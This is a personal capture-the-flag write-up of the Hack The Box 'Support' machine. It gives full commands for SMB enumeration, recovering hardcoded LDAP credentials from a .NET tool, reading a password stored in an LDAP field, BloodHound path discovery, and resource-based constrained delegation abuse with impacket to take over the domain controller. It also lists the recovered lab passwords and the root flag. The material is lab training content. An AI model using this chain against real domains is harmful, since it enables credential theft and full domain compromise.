---
box: Support
os: Windows
technique: AD-attacks
---
**Loots**
`support: Ironside47pleasure40Watchful` 
`ldap: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
`root.txt:b14afc82ad72a02b687c93e4ec445f4a`
# HTB Support

## 0. Pre-box workflow fixes

```bash
sudo openvpn <vpn-file>.ovpn
ip -br a | grep tun0

export IP=<target-ip>
echo $IP
ping -c 2 $IP
```

Add hostnames early:

```bash
echo "<IP> support.htb dc.support.htb" | sudo tee -a /etc/hosts # type the IP
getent hosts support.htb
getent hosts dc.support.htb
```

Things to fix in my workflow:

```text
- Start OpenVPN before everything else.
- Set and verify $IP before running tools.
- Fix newbox script.
- Investigate why ~/shared disappeared.
- Learn reliable copy/paste between Kali, Windows, and VM shared folders.
- Consider autorecon later, but do not let it replace manual enumeration.
```

---

# 1. Enumeration

## SMB enumeration with NetExec

I used `nxc smb`, not `smbmap`.

Start with basic SMB enumeration:

```bash
nxc smb $IP
nxc smb $IP --shares
```

If null/guest access works:

```bash
nxc smb $IP -u '' -p '' --shares
nxc smb $IP -u 'guest' -p '' --shares
```

RID brute to discover domain users / `sAMAccountName`s:

```bash
nxc smb $IP -u '' -p '' --rid-brute
```

If anonymous does not work, retry after finding credentials:

```bash
nxc smb $IP -d support.htb -u '<user>' -p '<password>' --rid-brute
```

Important lesson:

```text
Do not just look for “accessible” shares. Understand what is normal/default first.
```

Default/ordinary SMB shares:

```text
ADMIN$   - administrative share
C$       - administrative disk share
IPC$     - inter-process communication
NETLOGON - normal on domain controllers
SYSVOL   - normal on domain controllers
```

Mentally cross those off first. Then focus on non-default/custom shares.

Interesting share found:

```text
support-tools
```

Access it:

```bash
smbclient //$IP/support-tools -N
```

or, if credentials are needed:

```bash
smbclient //$IP/support-tools -U 'support.htb\<user>'
```

Inside the share:

```smb
ls
get UserInfo.exe.zip
```

Key observation:

```text
UserInfo.exe is interesting because it is not a default Windows/domain file.
The share name "support-tools" suggests custom internal tooling.
Custom internal tools often contain hardcoded credentials, LDAP logic, API keys, or domain-specific assumptions.
```

---

# 2. Reverse engineering UserInfo.exe

First check the file type. Do this before choosing tools.

```bash
unzip UserInfo.exe.zip
file UserInfo.exe
```

Finding:

```text
UserInfo.exe is a .NET executable.
```

Correct workflow:

```text
Do not waste time trying to reverse a .NET binary only inside Kali.
Copy it to the shared folder and decompile it on Windows with dnSpy.
```

Copy to VMware shared folder:

```bash
cp UserInfo.exe /mnt/hgfs/shared/
```

Then on Windows:

```text
1. Open dnSpy-net-win64.
2. Load UserInfo.exe.
3. Search for strings such as:
   - ldap
   - password
   - support
   - domain
   - user
   - Protected
   - Decrypt
4. Inspect the credential construction/decryption logic.
5. If a small C# decoding script is needed, write it in VSCode on Windows.
```

Important lesson:

```text
For .NET reversing, use the right tool.
dnSpy/ILSpy gives readable C# quickly.
Trying to reconstruct the logic with monodis in Kali wastes time unless dnSpy is unavailable.
```

Alternative : Execute and use wireshark to get ldap traffic

Result:

```text
ldap:<LDAP_PASSWORD>
```

---

# 3. LDAP enumeration

Do not filter only for `info` immediately.

The password could be in another attribute, so first dump/read the user object more broadly.

Start with general LDAP enumeration:

```bash
nxc ldap $IP -d support.htb -u 'ldap' -p '<LDAP_PASSWORD>'
nxc ldap $IP -d support.htb -u 'ldap' -p '<LDAP_PASSWORD>' --users
```

Query the `support` user without narrowing too early:

```bash
nxc ldap $IP -d support.htb -u 'ldap' -p '<LDAP_PASSWORD>' \
  --query "(sAMAccountName=support)" ""
```

Then inspect all returned fields manually.

After noticing the interesting field, it is fine to query it directly:

```bash
nxc ldap $IP -d support.htb -u 'ldap' -p '<LDAP_PASSWORD>' \
  --query "(sAMAccountName=support)" "info"
```

Finding:

```text
The support user's LDAP attributes contain a plaintext password in the info field.
```

Credential:

```text
support:<SUPPORT_PASSWORD>
```

Validate it:

```bash
nxc smb $IP -d support.htb -u 'support' -p '<SUPPORT_PASSWORD>'
nxc winrm $IP -d support.htb -u 'support' -p '<SUPPORT_PASSWORD>'
```

If WinRM shows `Pwn3d!`:

```bash
evil-winrm -i $IP -u 'support' -p '<SUPPORT_PASSWORD>'
```

Useful ports:

```text
5985/tcp = WinRM over HTTP
5986/tcp = WinRM over HTTPS
```

User flag:

```powershell
type C:\Users\support\Desktop\user.txt
```

---

# 4. BloodHound collection

The privilege escalation path was found through BloodHound, not local Windows enumeration.

Run collector:

```bash
bloodhound-python \
  -u 'support' \
  -p '<SUPPORT_PASSWORD>' \
  -d support.htb \
  -ns $IP \
  -dc dc.support.htb \
  -c All \
  --zip
```

Start BloodHound:

```bash
sudo bloodhound-start
```

Upload the generated `.zip`.

Expected path:

```text
support
  -> MemberOf
Shared Support Accounts
  -> GenericAll
DC.support.htb
```

Interpretation:

```text
The support user is a member of Shared Support Accounts.
Shared Support Accounts has GenericAll over the DC computer object.
Therefore, support can modify attributes on DC$, including the RBCD-related attribute msDS-AllowedToActOnBehalfOfOtherIdentity.
```

Main lesson:

```text
Do not rely only on local Windows enumeration for AD privilege escalation.
BloodHound is what revealed the GenericAll path.
Local enumeration can confirm context, but BloodHound gave the actual route.
```

Optional local confirmation after BloodHound:

```powershell
whoami
whoami /groups
net user support /domain
net group "Shared Support Accounts" /domain
```

But the privesc path comes from BloodHound.

---

# 5. Privilege escalation: RBCD abuse

## Concept

Because `support` effectively has `GenericAll` over `DC$`, we can abuse Resource-Based Constrained Delegation.

High-level chain:

```text
1. Create a fake computer account.
2. Configure DC$ to allow the fake computer to delegate to it.
3. Request a service ticket for cifs/dc.support.htb while impersonating Administrator.
4. Use the Kerberos ticket to access the DC as Administrator.
```

---

## Step 1: Add fake computer

```bash
impacket-addcomputer \
  -dc-ip $IP \
  -computer-name 'ATTACKVM$' \
  -computer-pass 'ComputerPassword123!' \
  'support.htb/support:<SUPPORT_PASSWORD>'
```

This creates:

```text
ATTACKVM$
```

Verify:

```bash
nxc smb $IP -d support.htb -u 'ATTACKVM$' -p 'ComputerPassword123!'
```

---

## Step 2: Configure RBCD

Correct direction:

```bash
impacket-rbcd \
  -dc-ip $IP \
  -action write \
  -delegate-from 'ATTACKVM$' \
  -delegate-to 'DC$' \
  'support.htb/support:<SUPPORT_PASSWORD>'
```

Meaning:

```text
ATTACKVM$ is allowed to act on behalf of other users to DC$.
```

Verify:

```bash
impacket-rbcd \
  -dc-ip $IP \
  -action read \
  -delegate-to 'DC$' \
  'support.htb/support:<SUPPORT_PASSWORD>'
```

---

## Step 3: Request Administrator service ticket

This is not “coercing a TGT”.

More accurate wording:

```text
Use S4U to request a service ticket for cifs/dc.support.htb while impersonating Administrator.
```

Command:

```bash
impacket-getST \
  -dc-ip $IP \
  -spn 'cifs/dc.support.htb' \
  -impersonate 'Administrator' \
  'support.htb/ATTACKVM$:ComputerPassword123!'
```

This creates a `.ccache` file.

Set it:

```bash
export KRB5CCNAME=<generated-ccache-file>
klist
```

---

## Step 4: Use the ticket

Use Kerberos authentication. Prefer hostname, not IP.

```bash
impacket-psexec -k -no-pass dc.support.htb
```

Alternative:

```bash
impacket-wmiexec -k -no-pass dc.support.htb
```

Then read root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

# Clean final attack chain

```bash
# 0. Setup
sudo openvpn <vpn-file>.ovpn
export IP=<target-ip>
echo "$IP support.htb dc.support.htb" | sudo tee -a /etc/hosts

# 1. SMB enumeration with NetExec
nxc smb $IP
nxc smb $IP -u '' -p '' --shares
nxc smb $IP -u '' -p '' --rid-brute

# 2. Access interesting share
smbclient //$IP/support-tools -N
# get UserInfo.exe.zip

# 3. Check binary type
unzip UserInfo.exe.zip
file UserInfo.exe

# 4. Since it is .NET, reverse on Windows
cp UserInfo.exe /mnt/hgfs/shared/
# Open in dnSpy-net-win64 on Windows.
# Recover ldap:<LDAP_PASSWORD>.

# 5. LDAP enum manually, do not filter too early
nxc ldap $IP -d support.htb -u 'ldap' -p '<LDAP_PASSWORD>' --users

nxc ldap $IP -d support.htb -u 'ldap' -p '<LDAP_PASSWORD>' \
  --query "(sAMAccountName=support)" ""

# Find support:<SUPPORT_PASSWORD>

# 6. Validate support creds
nxc winrm $IP -d support.htb -u 'support' -p '<SUPPORT_PASSWORD>'

# 7. User shell
evil-winrm -i $IP -u 'support' -p '<SUPPORT_PASSWORD>'

# 8. BloodHound collection
bloodhound-python \
  -u 'support' \
  -p '<SUPPORT_PASSWORD>' \
  -d support.htb \
  -ns $IP \
  -dc dc.support.htb \
  -c All \
  --zip

sudo bloodhound-start

# BloodHound path:
# support -> MemberOf -> Shared Support Accounts -> GenericAll -> DC.support.htb

# 9. Add fake computer
impacket-addcomputer \
  -dc-ip $IP \
  -computer-name 'ATTACKVM' \
  -computer-pass 'ComputerPassword123!' \
  'support.htb/support:<SUPPORT_PASSWORD>'

# 10. Configure RBCD
impacket-rbcd \
  -dc-ip $IP \
  -action write \
  -delegate-from 'ATTACKVM$' \
  -delegate-to 'DC$' \
  'support.htb/support:<SUPPORT_PASSWORD>'

# 11. Request Administrator service ticket
impacket-getST \
  -dc-ip $IP \
  -spn 'cifs/dc.support.htb' \
  -impersonate 'Administrator' \
  'support.htb/ATTACKVM$:ComputerPassword123!'

# 12. Use ticket
export KRB5CCNAME=<generated-ccache-file>
klist
impacket-psexec -k -no-pass dc.support.htb
```

Important corrections added:

```text
- SMB enum should use nxc smb, not smbmap.
- Use RID brute to discover domain account names / sAMAccountNames.
- Learn what default SMB shares look like so custom files stand out.
- Check file type before reversing.
- For .NET binaries, move to Windows and use dnSpy instead of wasting time in Kali.
- Do LDAP enumeration broadly before filtering only the info field.
- The privesc path was found with BloodHound, not local Windows enum.
- Skip Neo4j setup details in the notes.
```